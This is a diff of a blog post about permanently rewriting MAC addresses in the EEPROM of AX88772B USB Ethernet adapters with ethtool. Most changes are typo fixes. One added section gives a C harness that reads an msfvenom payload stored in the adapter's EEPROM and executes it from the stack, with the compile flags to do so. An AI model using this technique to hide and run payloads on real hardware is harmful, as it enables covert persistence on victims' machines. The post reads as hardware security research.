@@ -6,7 +6,7 @@ categories: eeprom nic
 author: Nicholas Starke
 ---
 
-My new friend [Gundiuc Oleg](https://twitter.com/GundiucO) reached out to me regarding [an older blog post I wrote](https://nstarke.github.io/networking/mac-address/ethtool/2019/09/21/ethtool-change-mac-address-permanently.html) about permanently changing MAC addresses on NICs.  Gundiuc was targetting the AX88772B chipset on USB ethernet adapters.  If you're interested in following along, I used [this USB Ethernet adapter](https://www.amazon.com/gp/product/B00MYT481C) for testing (no affiliate link - I don't make any money if you buy one).
+My new friend [Gundiuc Oleg](https://twitter.com/GundiucO) reached out to me regarding [an older blog post I wrote](https://nstarke.github.io/networking/mac-address/ethtool/2019/09/21/ethtool-change-mac-address-permanently.html) about permanently changing MAC addresses on NICs.  Gundiuc was targeting the AX88772B chipset on USB ethernet adapters.  If you're interested in following along, I used [this USB Ethernet adapter](https://www.amazon.com/gp/product/B00MYT481C) for testing (no affiliate link - I don't make any money if you buy one).
 
 The purpose of this article is to demonstrate some techniques for permanently changing MAC addresses on this chipset in more detail than the previous post.  
 
@@ -57,7 +57,7 @@ Now this is a nice hexdump of the EEPROM data for human consumption, but if we w
 # ethtool -e enx000ec646478d raw on > eeprom.bin
 ```
 
-This will give us the EEPROM dump as binary data.  We can then use our favorite hex editor to change the six byte MAC address at offset **0x8** into the EEPROM dump.  A quick note, the NIC chipset [expects data to be read](https://github.com/torvalds/linux/blob/master/drivers/net/usb/asix_common.c#L693) in **0x10** byte incremenets, so we are not able to write directly to **0x8**, we must read the first 0x10 bytes and modify the six bytes starting at 0x8.  My recommendation is to read out the full contents of the EEPROM then use a hex editor to modify just the bytes you wish to modify.  Keep in mind the full EEPROM dump [must equal](https://github.com/torvalds/linux/blob/master/drivers/net/usb/asix.h#L159) **0x200** (decimal 512).  I mention this because sometimes when I use vim in xxd mode, the conversion back to binary results in an extra newline character being appended to the end of whatever binary data I am working with.  So just as a sanity check, run **ls -l eeprom.bin** to ensure the file size is **512**.
+This will give us the EEPROM dump as binary data.  We can then use our favorite hex editor to change the six byte MAC address at offset **0x8** into the EEPROM dump.  A quick note, the NIC chipset [expects data to be read](https://github.com/torvalds/linux/blob/master/drivers/net/usb/asix_common.c#L693) in **0x10** byte incremenets, so we are not able to write directly to **0x8**, we must read the first 0x10 bytes and modify the six bytes starting at 0x8.  My recommendation is to read out the full contents of the EEPROM then use a hex editor to modify just the bytes you wish to modify.  Keep in mind the full EEPROM dump length [must equal](https://github.com/torvalds/linux/blob/master/drivers/net/usb/asix.h#L159) **0x200** (decimal 512).  I mention this because sometimes when I use vim in xxd mode, the conversion back to binary results in an extra newline character being appended to the end of whatever binary data I am working with.  So just as a sanity check, run **ls -l eeprom.bin** to ensure the file size is **512**.
 
 After we have made our modifications to eeprom.bin, we need to flash those changes to the chipset.  The command to do so in this instance is:
 
@@ -135,3 +135,46 @@ This is a 111 byte payload. We can make the last byte a NOP (0x90) in order to c
  ```
 
  At this point, after this data is flashed to the NIC EEPROM, it is possible to use **ethtool** to retrieve the msfvenom payload and then execute it.  For this particular chipset, we have 192 (0xc0) bytes to store a payload.  That is from EEPROM offset 0x140 to the end of the EEPROM data at 0x200.  
+
+ Here is some example C code to demonstrate how this works.
+
+ ```c++
+#include <stdio.h>
+#include <stdlib.h>
+
+#define SHELL_CODE_START 400
+#define ETHTOOL_OUTPUT_LENGTH 512
+
+int main(int argc, char **argv) {
+    FILE *fp;
+    unsigned char buffer[ETHTOOL_OUTPUT_LENGTH + 1];
+    void(*shell_code)();
+
+    fp = popen("ethtool -e enx000ec646478d raw on", "r");
+    if (!fp) {
+	    perror("popen");
+    }
+
+    fgets(buffer, sizeof(buffer), fp);
+    
+    pclose(fp);
+    
+    shell_code = (void(*)()) (buffer + SHELL_CODE_START);
+    printf("running shell code\n");
+    (shell_code)();
+
+    return 0;
+}
+ ```
+
+ This code will need to be compiled with gcc as such:
+
+ ```
+ $ gcc -o harness -m32 -z execstack harness.c
+ ```
+
+ The **-m32** is because the shellcode is **x86** targeted in the example above.
+
+ The **-z execstack** is necessary because we are storing the shell code in a local variable, which is located on the stack.  Therefore, we are executing directly off the stack in this example.  This could be easily fixed by using **mmap** and executing from somewhere else in memory.
+
+ Happy hacking!
